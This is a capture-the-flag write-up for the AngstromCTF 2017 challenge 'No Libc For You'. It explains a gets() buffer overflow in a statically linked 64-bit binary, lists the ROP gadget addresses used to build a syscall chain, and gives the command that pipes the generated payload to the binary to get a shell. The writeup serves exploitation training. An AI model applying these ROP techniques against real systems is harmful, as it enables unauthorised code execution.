# AngstromCTF 2017 - Binary 150 - No Libc For You

## Message
Even ASLR and NX can't seem to stop you from exploiting all these buffer overflows. Rather than remove the buffer overflows, we decided to use static linking so you can't access libc anymore! Can you get the flag with no system() to help you out? Go ahead and give it a try on the shell server.

## Writeup
We are given a statically linked, 64-bit ELF binary and source-code. Looking at the source, it is a straight forward buffer-overflow in gets(). The problem is that we don't have system() or the string /bin/sh in our binary, so we have to use other ROP techniques to exploit the binary.

### Solution
  Lucky we have access to ROP gadgets in __libc_csu_init(). We are going to have everything that we need for a complete ROP chain.

Write-what-where gadgets
0x4734e1 mov qword ptr [rsi], rax ; ret
0x4015e7 pop rsi ; ret
0x477a36 pop rax ; pop rdx ; pop rbx ; ret
0x42550f xor rax, rax ; ret

Init syscall number gadgets
0x42550f xor rax, rax ; ret
0x465b90 add rax, 1 ; ret
0x465b91 add eax, 1 ; ret

Init syscall argument gadgets
0x4014c6 pop rdi ; ret
0x4015e7 pop rsi ; ret
0x441d06 pop rdx ; ret

Syscall gadget
0x4666d5 syscall ; ret

Using these gadgets I generated my payload via ![exploit.py](exploit.py) which writes the shellcode to the file
![shellcode](shellcode)

Then the exploit is run.

(cat shellcode ; cat) | ./nolibc4u

We get our shell!!!

 
